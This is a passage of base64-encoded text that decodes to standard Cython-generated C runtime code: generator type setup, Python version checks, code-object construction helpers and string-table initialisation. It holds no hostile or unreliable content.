UHlPYmplY3RfR2VuZXJpY0dldEF0dHJ9LAojaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogICAge1B5X3RwX2ZpbmFsaXplLCAodm9pZCAqKV9fUHl4X0Nvcm91dGluZV9kZWx9LAojZW5kaWYKI2lmIF9fUFlYX0hBU19QWV9BTV9TRU5EID09IDEKICAgIHtQeV9hbV9zZW5kLCAodm9pZCAqKV9fUHl4X0Nvcm91dGluZV9BbVNlbmR9LAojZW5kaWYKICAgIHswLCAwfSwKfTsKc3RhdGljIFB5VHlwZV9TcGVjIF9fcHl4X0dlbmVyYXRvclR5cGVfc3BlYyA9IHsKICAgIF9fUFlYX1RZUEVfTU9EVUxFX1BSRUZJWCAiZ2VuZXJhdG9yIiwKICAgIHNpemVvZihfX3B5eF9Db3JvdXRpbmVPYmplY3QpLAogICAgMCwKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDAKICAgIFB5X1RQRkxBR1NfSU1NVVRBQkxFVFlQRSB8CiNlbmRpZgogICAgUHlfVFBGTEFHU19ERUZBVUxUIHwgUHlfVFBGTEFHU19IQVZFX0dDIHwgUHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFIHwgX19QeXhfVFBGTEFHU19IQVZFX0FNX1NFTkQsCiAgICBfX3B5eF9HZW5lcmF0b3JUeXBlX3Nsb3RzCn07CiNpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAyCnN0YXRpYyBfX1B5eF9QeUFzeW5jTWV0aG9kc1N0cnVjdCBfX3B5eF9HZW5lcmF0b3JfYXNfYXN5bmM7CiNlbmRpZgpzdGF0aWMgaW50IF9fcHl4X0dlbmVyYXRvcl9pbml0KFB5T2JqZWN0ICptb2R1bGUpIHsKICAgIF9fcHl4X21zdGF0ZXR5cGUgKm1zdGF0ZSA9IF9fUHl4X1B5TW9kdWxlX0dldFN0YXRlKG1vZHVsZSk7CiAgICBtc3RhdGUtPl9fcHl4X0dlbmVyYXRvclR5cGUgPSBfX1B5eF9GZXRjaENvbW1vblR5cGVGcm9tU3BlYygKICAgICAgICBtc3RhdGUtPl9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzVHlwZSwgbW9kdWxlLCAmX19weXhfR2VuZXJhdG9yVHlwZV9zcGVjLCBOVUxMKTsKICAgIGlmICh1bmxpa2VseSghbXN0YXRlLT5fX3B5eF9HZW5lcmF0b3JUeXBlKSkgewogICAgICAgIHJldHVybiAtMTsKICAgIH0KI2lmIF9fUFlYX0hBU19QWV9BTV9T""RU5EID09IDIKICAgIF9fUHl4X1NldEJhY2twb3J0VHlwZUFtU2VuZChtc3RhdGUtPl9fcHl4X0dlbmVyYXRvclR5cGUsICZfX3B5eF9HZW5lcmF0b3JfYXNfYXN5bmMsICZfX1B5eF9Db3JvdXRpbmVfQW1TZW5kKTsKI2VuZGlmCiAgICByZXR1cm4gMDsKfQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dlbmVyYXRvcl9HZXRJbmxpbmVkUmVzdWx0KFB5T2JqZWN0ICpzZWxmKSB7CiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QqKSBzZWxmOwogICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7CiAgICBpZiAodW5saWtlbHkoX19QeXhfQ29yb3V0aW5lX3Rlc3RfYW5kX3NldF9pc19ydW5uaW5nKGdlbikpKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKGdlbik7CiAgICB9CiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIFB5X05vbmUsICZyZXR2YWwsIDApOwogICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTsKICAgICh2b2lkKSByZXN1bHQ7CiAgICBhc3NlcnQgKHJlc3VsdCA9PSBQWUdFTl9SRVRVUk4gfHwgcmVzdWx0ID09IFBZR0VOX0VSUk9SKTsKICAgIGFzc2VydCAoKHJlc3VsdCA9PSBQWUdFTl9SRVRVUk4gJiYgcmV0dmFsICE9IE5VTEwpIHx8IChyZXN1bHQgPT0gUFlHRU5fRVJST1IgJiYgcmV0dmFsID09IE5VTEwpKTsKICAgIHJldHVybiByZXR2YWw7Cn0KCgpzdGF0aWMgdW5zaWduZWQgbG9uZyBfX1B5eF9nZXRfcnVudGltZV92ZXJzaW9uKHZvaWQpIHsKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBiMDAwMAogICAgcmV0dXJuIFB5X1ZlcnNpb24gJiB+MHhGRlVMOwojZWxzZQogICAgc3RhdGljIHVuc2lnbmVkIGxvbmcgX19QeXhfY2FjaGVkX3J1bnRpbWVfdmVyc2lvbiA9IDA7CiAgICBpZiAoX19QeXhfY2FjaGVkX3J1bnRpbWVfdmVyc2lvbiA9PSAwKSB7CiAgICAgICAgY29uc3QgY2hhciogcnRfdmVyc2lvbiA9IFB5X0dldFZlcnNpb24oKTsKICAgICAgICB1bnNpZ25lZCBsb25nIHZlcnNpb24gPSAwOwogICAgICAgIHVuc2lnbmVkIGxvbmcgZmFjdG9yID0gMHgwMTAwMDAwMFVMOwogICAgICAgIHVuc2lnbmVkIGludCBkaWdpdCA9IDA7CiAgICAgICAgaW50IGkgPSAwOwogICAgICAgIHdoaWxlIChmYWN0b3IpIHsKICAgICAgICAgICAgd2hpbGUgKCcwJyA8PSBydF92ZXJzaW9uW2ldICYmIHJ0X3ZlcnNpb25baV0gPD0gJzknKSB7CiAgICAgICAgICAgICAgICBkaWdpdCA9IGRpZ2l0ICogMTAgKyAodW5zaWduZWQgaW50KSAocnRfdmVyc2lvbltpXSAtICcwJyk7CiAgICAgICAgICAgICAgICArK2k7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgdmVyc2lvbiArPSBmYWN0b3IgKiBkaWdpdDsKICAgICAgICAgICAgaWYgKHJ0X3ZlcnNpb25baV0gIT0gJy4nKQogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAg""ICAgIGRpZ2l0ID0gMDsKICAgICAgICAgICAgZmFjdG9yID4+PSA4OwogICAgICAgICAgICArK2k7CiAgICAgICAgfQogICAgICAgIF9fUHl4X2NhY2hlZF9ydW50aW1lX3ZlcnNpb24gPSB2ZXJzaW9uOwogICAgfQogICAgcmV0dXJuIF9fUHl4X2NhY2hlZF9ydW50aW1lX3ZlcnNpb247CiNlbmRpZgp9CgoKc3RhdGljIGludCBfX1B5eF9jaGVja19iaW5hcnlfdmVyc2lvbih1bnNpZ25lZCBsb25nIGN0X3ZlcnNpb24sIHVuc2lnbmVkIGxvbmcgcnRfdmVyc2lvbiwgaW50IGFsbG93X25ld2VyKSB7CiAgICBjb25zdCB1bnNpZ25lZCBsb25nIE1BSk9SX01JTk9SID0gMHhGRkZGMDAwMFVMOwogICAgaWYgKChydF92ZXJzaW9uICYgTUFKT1JfTUlOT1IpID09IChjdF92ZXJzaW9uICYgTUFKT1JfTUlOT1IpKQogICAgICAgIHJldHVybiAwOwogICAgaWYgKGxpa2VseShhbGxvd19uZXdlciAmJiAocnRfdmVyc2lvbiAmIE1BSk9SX01JTk9SKSA+IChjdF92ZXJzaW9uICYgTUFKT1JfTUlOT1IpKSkKICAgICAgICByZXR1cm4gMTsKICAgIHsKICAgICAgICBjaGFyIG1lc3NhZ2VbMjAwXTsKICAgICAgICBQeU9TX3NucHJpbnRmKG1lc3NhZ2UsIHNpemVvZihtZXNzYWdlKSwKICAgICAgICAgICAgICAgICAgICAgICJjb21waWxlIHRpbWUgUHl0aG9uIHZlcnNpb24gJWQuJWQgIgogICAgICAgICAgICAgICAgICAgICAgIm9mIG1vZHVsZSAnJS4xMDBzJyAiCiAgICAgICAgICAgICAgICAgICAgICAiJXMgIgogICAgICAgICAgICAgICAgICAgICAgInJ1bnRpbWUgdmVyc2lvbiAlZC4lZCIsCiAgICAgICAgICAgICAgICAgICAgICAgKGludCkgKGN0X3ZlcnNpb24gPj4gMjQpLCAoaW50KSAoKGN0X3ZlcnNpb24gPj4gMTYpICYgMHhGRiksCiAgICAgICAgICAgICAgICAgICAgICAgX19QeXhfTU9EVUxFX05BTUUsCiAgICAgICAgICAgICAgICAgICAgICAgKGFsbG93X25ld2VyKSA/ICJ3YXMgbmV3ZXIgdGhhbiIgOiAiZG9lcyBub3QgbWF0Y2giLAogICAgICAgICAgICAgICAgICAgICAgIChpbnQpIChydF92ZXJzaW9uID4+IDI0KSwgKGludCkgKChydF92ZXJzaW9uID4+IDE2KSAmIDB4RkYpCiAgICAgICApOwogICAgICAgIHJldHVybiBQeUVycl9XYXJuRXgoTlVMTCwgbWVzc2FnZSwgMSk7CiAgICB9Cn0KCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9fUHlDb2RlX05ldyhpbnQgYSwgaW50IHAsIGludCBrLCBpbnQgbCwgaW50IHMsIGludCBmLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKmMsIFB5T2JqZWN0KiBuLCBQeU9iamVjdCAqdiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmZ2LCBQeU9iamVjdCAqY2VsbCwgUHlPYmplY3QqIGZuLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqbmFtZSwgaW50IGZsaW5lLCBQeU9i""amVjdCAqbG5vcykgewogICAgICAgIFB5T2JqZWN0ICpleGNlcHRpb25fdGFibGUgPSBOVUxMOwogICAgICAgIFB5T2JqZWN0ICp0eXBlc19tb2R1bGU9TlVMTCwgKmNvZGVfdHlwZT1OVUxMLCAqcmVzdWx0PU5VTEw7CiAgICAgICAgI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMGIwMDAwCiAgICAgICAgUHlPYmplY3QgKnZlcnNpb25faW5mbzsKICAgICAgICBQeU9iamVjdCAqcHlfbWlub3JfdmVyc2lvbiA9IE5VTEw7CiAgICAgICAgI2VuZGlmCiAgICAgICAgbG9uZyBtaW5vcl92ZXJzaW9uID0gMDsKICAgICAgICBQeU9iamVjdCAqdHlwZSwgKnZhbHVlLCAqdHJhY2ViYWNrOwogICAgICAgIFB5RXJyX0ZldGNoKCZ0eXBlLCAmdmFsdWUsICZ0cmFjZWJhY2spOwogICAgICAgICNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwYjAwMDAKICAgICAgICBtaW5vcl92ZXJzaW9uID0gMTE7CiAgICAgICAgI2Vsc2UKICAgICAgICBpZiAoISh2ZXJzaW9uX2luZm8gPSBQeVN5c19HZXRPYmplY3QoInZlcnNpb25faW5mbyIpKSkgZ290byBlbmQ7CiAgICAgICAgaWYgKCEocHlfbWlub3JfdmVyc2lvbiA9IFB5U2VxdWVuY2VfR2V0SXRlbSh2ZXJzaW9uX2luZm8sIDEpKSkgZ290byBlbmQ7CiAgICAgICAgbWlub3JfdmVyc2lvbiA9IFB5TG9uZ19Bc0xvbmcocHlfbWlub3JfdmVyc2lvbik7CiAgICAgICAgUHlfREVDUkVGKHB5X21pbm9yX3ZlcnNpb24pOwogICAgICAgIGlmIChtaW5vcl92ZXJzaW9uID09IC0xICYmIFB5RXJyX09jY3VycmVkKCkpIGdvdG8gZW5kOwogICAgICAgICNlbmRpZgogICAgICAgIGlmICghKHR5cGVzX21vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZSgidHlwZXMiKSkpIGdvdG8gZW5kOwogICAgICAgIGlmICghKGNvZGVfdHlwZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcodHlwZXNfbW9kdWxlLCAiQ29kZVR5cGUiKSkpIGdvdG8gZW5kOwogICAgICAgIGlmIChtaW5vcl92ZXJzaW9uIDw9IDcpIHsKICAgICAgICAgICAgKHZvaWQpcDsKICAgICAgICAgICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uKGNvZGVfdHlwZSwgImlpaWlpT09PT09PaU9PTyIsIGEsIGssIGwsIHMsIGYsIGNvZGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgYywgbiwgdiwgZm4sIG5hbWUsIGZsaW5lLCBsbm9zLCBmdiwgY2VsbCk7CiAgICAgICAgfSBlbHNlIGlmIChtaW5vcl92ZXJzaW9uIDw9IDEwKSB7CiAgICAgICAgICAgIHJlc3VsdCA9IFB5T2JqZWN0X0NhbGxGdW5jdGlvbihjb2RlX3R5cGUsICJpaWlpaWlPT09PT09pT09PIiwgYSxwLCBrLCBsLCBzLCBmLCBjb2RlLAogICAgICAgICAgICAgICAgICAgICAgICAgIGMsIG4sIHYsIGZuLCBuYW1lLCBmbGluZSwgbG5vcywgZnYsIGNlbGwpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGlmICghKGV4Y2VwdGlvbl90YWJsZSA9IFB5Qnl0ZXNfRnJvbVN0cmluZ0FuZFNpemUoTlVMTCwgMCkpKSBnb3RvIGVuZDsKICAgICAg""ICAgICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uKGNvZGVfdHlwZSwgImlpaWlpaU9PT09PT09pT09PTyIsIGEscCwgaywgbCwgcywgZiwgY29kZSwKICAgICAgICAgICAgICAgICAgICAgICAgICBjLCBuLCB2LCBmbiwgbmFtZSwgbmFtZSwgZmxpbmUsIGxub3MsIGV4Y2VwdGlvbl90YWJsZSwgZnYsIGNlbGwpOwogICAgICAgIH0KICAgIGVuZDoKICAgICAgICBQeV9YREVDUkVGKGNvZGVfdHlwZSk7CiAgICAgICAgUHlfWERFQ1JFRihleGNlcHRpb25fdGFibGUpOwogICAgICAgIFB5X1hERUNSRUYodHlwZXNfbW9kdWxlKTsKICAgICAgICBpZiAodHlwZSkgewogICAgICAgICAgICBQeUVycl9SZXN0b3JlKHR5cGUsIHZhbHVlLCB0cmFjZWJhY2spOwogICAgICAgIH0KICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQojZWxpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMDAwCiAgc3RhdGljIFB5Q29kZU9iamVjdCogX19QeXhfX1B5Q29kZV9OZXcoaW50IGEsIGludCBwLCBpbnQgaywgaW50IGwsIGludCBzLCBpbnQgZiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKmMsIFB5T2JqZWN0KiBuLCBQeU9iamVjdCAqdiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZnYsIFB5T2JqZWN0ICpjZWxsLCBQeU9iamVjdCogZm4sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKm5hbWUsIGludCBmbGluZSwgUHlPYmplY3QgKmxub3MpIHsKICAgIFB5Q29kZU9iamVjdCAqcmVzdWx0OwogICAgcmVzdWx0ID0KICAgICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAKICAgICAgICBQeVVuc3RhYmxlX0NvZGVfTmV3V2l0aFBvc09ubHlBcmdzCiAgICAgICNlbHNlCiAgICAgICAgUHlDb2RlX05ld1dpdGhQb3NPbmx5QXJncwogICAgICAjZW5kaWYKICAgICAgICAoYSwgcCwgaywgbCwgcywgZiwgY29kZSwgYywgbiwgdiwgZnYsIGNlbGwsIGZuLCBuYW1lLCBuYW1lLCBmbGluZSwgbG5vcywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfYnl0ZXMpOwogICAgcmV0dXJuIHJlc3VsdDsKICB9CiNlbGlmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwQjIgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQogICNkZWZpbmUgX19QeXhfX1B5Q29kZV9OZXcoYSwgcCwgaywgbCwgcywgZiwgY29kZSwgYywgbiwgdiwgZnYsIGNlbGwsIGZuLCBuYW1lLCBmbGluZSwgbG5vcylcCiAgICAgICAgICBQeUNvZGVfTmV3V2l0aFBvc09ubHlBcmdzKGEsIHAsIGssIGwsIHMsIGYsIGNvZGUsIGMsIG4sIHYsIGZ2LCBjZWxsLCBmbiwgbmFtZSwgZmxpbmUsIGxub3MpCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9fUHlDb2RlX05ldyhhLCBwLCBrLCBsLCBzLCBmLCBjb2RlLCBjLCBuLCB2LCBmdiwgY2VsbCwgZm4sIG5hbWUsIGZsaW5lLCBsbm9zKVwKICAgICAgICAgIFB5""Q29kZV9OZXcoYSwgaywgbCwgcywgZiwgY29kZSwgYywgbiwgdiwgZnYsIGNlbGwsIGZuLCBuYW1lLCBmbGluZSwgbG5vcykKI2VuZGlmCnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlDb2RlX05ldygKICAgICAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyLAogICAgICAgIFB5T2JqZWN0ICogY29uc3QgKnZhcm5hbWVzLAogICAgICAgIFB5T2JqZWN0ICpmaWxlbmFtZSwKICAgICAgICBQeU9iamVjdCAqZnVuY25hbWUsCiAgICAgICAgY29uc3QgY2hhciAqbGluZV90YWJsZSwKICAgICAgICBQeU9iamVjdCAqdHVwbGVfZGVkdXBfbWFwCikgewogICAgUHlPYmplY3QgKmNvZGVfb2JqID0gTlVMTCwgKnZhcm5hbWVzX3R1cGxlX2RlZHVwID0gTlVMTCwgKmNvZGVfYnl0ZXMgPSBOVUxMLCAqbGluZV90YWJsZV9ieXRlcyA9IE5VTEw7CiAgICBQeV9zc2l6ZV90IHZhcl9jb3VudCA9IChQeV9zc2l6ZV90KSBkZXNjci5ubG9jYWxzOwogICAgUHlPYmplY3QgKnZhcm5hbWVzX3R1cGxlID0gUHlUdXBsZV9OZXcodmFyX2NvdW50KTsKICAgIGlmICh1bmxpa2VseSghdmFybmFtZXNfdHVwbGUpKSByZXR1cm4gTlVMTDsKICAgIGZvciAoUHlfc3NpemVfdCBpPTA7IGkgPCB2YXJfY291bnQ7IGkrKykgewogICAgICAgIFB5X0lOQ1JFRih2YXJuYW1lc1tpXSk7CiAgICAgICAgaWYgKF9fUHl4X1B5VHVwbGVfU0VUX0lURU0odmFybmFtZXNfdHVwbGUsIGksIHZhcm5hbWVzW2ldKSAhPSAoMCkpIGdvdG8gZG9uZTsKICAgIH0KICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICB2YXJuYW1lc190dXBsZV9kZWR1cCA9IFB5RGljdF9HZXRJdGVtKHR1cGxlX2RlZHVwX21hcCwgdmFybmFtZXNfdHVwbGUpOwogICAgaWYgKCF2YXJuYW1lc190dXBsZV9kZWR1cCkgewogICAgICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbSh0dXBsZV9kZWR1cF9tYXAsIHZhcm5hbWVzX3R1cGxlLCB2YXJuYW1lc190dXBsZSkgPCAwKSkgZ290byBkb25lOwogICAgICAgIHZhcm5hbWVzX3R1cGxlX2RlZHVwID0gdmFybmFtZXNfdHVwbGU7CiAgICB9CiAgICAjZWxzZQogICAgdmFybmFtZXNfdHVwbGVfZGVkdXAgPSBQeURpY3RfU2V0RGVmYXVsdCh0dXBsZV9kZWR1cF9tYXAsIHZhcm5hbWVzX3R1cGxlLCB2YXJuYW1lc190dXBsZSk7CiAgICBpZiAodW5saWtlbHkoIXZhcm5hbWVzX3R1cGxlX2RlZHVwKSkgZ290byBkb25lOwogICAgI2VuZGlmCiAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgIFB5X0lOQ1JFRih2YXJuYW1lc190dXBsZV9kZWR1cCk7CiAgICAjZW5kaWYKICAgIGlmIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49ICgweDAzMGIwMDAwKSAmJiBsaW5lX3RhYmxlICE9IE5VTEwKICAgICAgICAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTCkgewogICAgICAgIGxpbmVfdGFibGVfYnl0ZXMgPSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplKGxpbmVfdGFi""bGUsIGRlc2NyLmxpbmVfdGFibGVfbGVuZ3RoKTsKICAgICAgICBpZiAodW5saWtlbHkoIWxpbmVfdGFibGVfYnl0ZXMpKSBnb3RvIGRvbmU7CiAgICAgICAgUHlfc3NpemVfdCBjb2RlX2xlbiA9IChkZXNjci5saW5lX3RhYmxlX2xlbmd0aCAqIDIgKyA0KSAmIH4zOwogICAgICAgIGNvZGVfYnl0ZXMgPSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplKE5VTEwsIGNvZGVfbGVuKTsKICAgICAgICBpZiAodW5saWtlbHkoIWNvZGVfYnl0ZXMpKSBnb3RvIGRvbmU7CiAgICAgICAgY2hhciogY19jb2RlX2J5dGVzID0gUHlCeXRlc19Bc1N0cmluZyhjb2RlX2J5dGVzKTsKICAgICAgICBpZiAodW5saWtlbHkoIWNfY29kZV9ieXRlcykpIGdvdG8gZG9uZTsKICAgICAgICBtZW1zZXQoY19jb2RlX2J5dGVzLCAwLCAoc2l6ZV90KSBjb2RlX2xlbik7CiAgICB9CiAgICBjb2RlX29iaiA9IChQeU9iamVjdCopIF9fUHl4X19QeUNvZGVfTmV3KAogICAgICAgIChpbnQpIGRlc2NyLmFyZ2NvdW50LAogICAgICAgIChpbnQpIGRlc2NyLm51bV9wb3Nvbmx5X2FyZ3MsCiAgICAgICAgKGludCkgZGVzY3IubnVtX2t3b25seV9hcmdzLAogICAgICAgIChpbnQpIGRlc2NyLm5sb2NhbHMsCiAgICAgICAgMCwKICAgICAgICAoaW50KSBkZXNjci5mbGFncywKICAgICAgICBjb2RlX2J5dGVzID8gY29kZV9ieXRlcyA6IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X2J5dGVzLAogICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLAogICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLAogICAgICAgIHZhcm5hbWVzX3R1cGxlX2RlZHVwLAogICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLAogICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLAogICAgICAgIGZpbGVuYW1lLAogICAgICAgIGZ1bmNuYW1lLAogICAgICAgIChpbnQpIGRlc2NyLmZpcnN0X2xpbmUsCiAgICAgICAgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gKDB4MDMwYjAwMDApICYmIGxpbmVfdGFibGVfYnl0ZXMpID8gbGluZV90YWJsZV9ieXRlcyA6IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X2J5dGVzCiAgICApOwpkb25lOgogICAgUHlfWERFQ1JFRihjb2RlX2J5dGVzKTsKICAgIFB5X1hERUNSRUYobGluZV90YWJsZV9ieXRlcyk7CiAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgIFB5X1hERUNSRUYodmFybmFtZXNfdHVwbGVfZGVkdXApOwogICAgI2VuZGlmCiAgICBQeV9ERUNSRUYodmFybmFtZXNfdHVwbGUpOwogICAgcmV0dXJuIGNvZGVfb2JqOwp9CgoKc3RhdGljIGludCBfX1B5eF9Jbml0U3RyaW5ncyhfX1B5eF9TdHJpbmdUYWJFbnRyeSBjb25zdCAqdCwgUHlPYmplY3QgKip0YXJnZXQsIGNvbnN0IGNoYXIqIGNvbnN0KiBlbmNvZGluZ19uYW1lcykgewogICAgd2hpbGUgKHQtPnMpIHsKICAgICAgICBQ""eU9iamVjdCAqc3RyOwogICAgICAgIGlmICh0LT5pc191bmljb2RlKSB7CiAgICAgICAgICAgIGlmICh0LT5pbnRlcm4pIHsKICAgICAgICAgICAgICAgIHN0ciA9IFB5VW5pY29kZV9JbnRlcm5Gcm9tU3RyaW5nKHQtPnMpOwogICAgICAgICAgICB9IGVsc2UgaWYgKHQtPmVuY29kaW5nKSB7CiAgICAgICAgICAgICAgICBzdHIgPSBQeVVuaWNvZGVfRGVjb2RlKHQtPnMsIHQtPm4gLSAxLCBlbmNvZGluZ19uYW1lc1t0LT5lbmNvZGluZ10sIE5VTEwpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgc3RyID0gUHlVbmljb2RlX0Zyb21TdHJpbmdBbmRTaXplKHQtPnMsIHQtPm4gLSAxKTsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHN0ciA9IFB5Qnl0ZXNfRnJvbVN0cmluZ0FuZFNpemUodC0+cywgdC0+biAtIDEpOwogICAgICAgIH0KICAgICAgICBpZiAoIXN0cikKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICp0YXJnZXQgPSBzdHI7CiAgICAgICAgaWYgKFB5T2JqZWN0X0hhc2goc3RyKSA9PSAtMSkKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICsrdDsKICAgICAgICArK3RhcmdldDsKICAgIH0KICAgIHJldHVybiAwOwp9CgojaW5jbHVkZSA8c3RyaW5nLmg+CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5X3NzaXplX3QgX19QeXhfc3NpemVfc3RybGVuKGNvbnN0IGNoYXIgKnMpIHsKICAgIHNpemVfdCBsZW4gPSBzdHJsZW4ocyk7CiAgICBpZiAodW5saWtlbHkobGVuID4gKHNpemVfdCkgUFlfU1NJWkVfVF9NQVgpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX092ZXJmbG93RXJyb3IsICJieXRlIHN0cmluZyBpcyB0b28gbG9uZyIpOwogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIHJldHVybiAoUHlfc3NpemVfdCkgbGVuOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZyhjb25zdCBjaGFyKiBjX3N0cikgewogICAgUHlfc3NpemVfdCBsZW4gPSBfX1B5eF9zc2l6ZV9zdHJsZW4oY19zdHIpOwogICAgaWYgKHVubGlrZWx5KGxlbiA8IDApKSByZXR1cm4gTlVMTDsKICAgIHJldHVybiBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZ0FuZFNpemUoY19zdHIsIGxlbik7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21TdHJpbmcoY29uc3QgY2hhciogY19zdHIpIHsKICAgIFB5X3NzaXplX3QgbGVuID0gX19QeXhfc3NpemVfc3RybGVuKGNfc3RyKTsKICAgIGlmICh1bmxpa2VseShsZW4gPCAwKSkgcmV0dXJuIE5VTEw7CiAgICByZXR1cm4gUHlCeXRlQXJyYXlfRnJvbVN0cmluZ0FuZFNpemUoY19zdHIsIGxlbik7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgY29uc3QgY2hhciogX19QeXhfUHlPYmplY3RfQXNTdHJpbmcoUHlPYmplY3QqIG8pIHsKICAgIFB5X3NzaXplX3QgaWdub3JlOwogICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0FzU3Ry""aW5nQW5kU2l6ZShvLCAmaWdub3JlKTsKfQojaWYgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfQVNDSUkgfHwgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfVVRGOApzdGF0aWMgQ1lUSE9OX0lOTElORSBjb25zdCBjaGFyKiBfX1B5eF9QeVVuaWNvZGVfQXNTdHJpbmdBbmRTaXplKFB5T2JqZWN0KiBvLCBQeV9zc2l6ZV90ICpsZW5ndGgpIHsKICAgIGlmICh1bmxpa2VseShfX1B5eF9QeVVuaWNvZGVfUkVBRFkobykgPT0gLTEpKSByZXR1cm4gTlVMTDsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHsKICAgICAgICBjb25zdCBjaGFyKiByZXN1bHQ7CiAgICAgICAgUHlfc3NpemVfdCB1bmljb2RlX2xlbmd0aDsKICAgICAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUih1bmljb2RlX2xlbmd0aCk7IC8vIG9ubHkgZm9yIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJCiAgICAgICAgI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwCiAgICAgICAgaWYgKHVubGlrZWx5KFB5QXJnX1BhcnNlKG8sICJzIyIsICZyZXN1bHQsIGxlbmd0aCkgPCAwKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgI2Vsc2UKICAgICAgICByZXN1bHQgPSBQeVVuaWNvZGVfQXNVVEY4QW5kU2l6ZShvLCBsZW5ndGgpOwogICAgICAgICNlbmRpZgogIC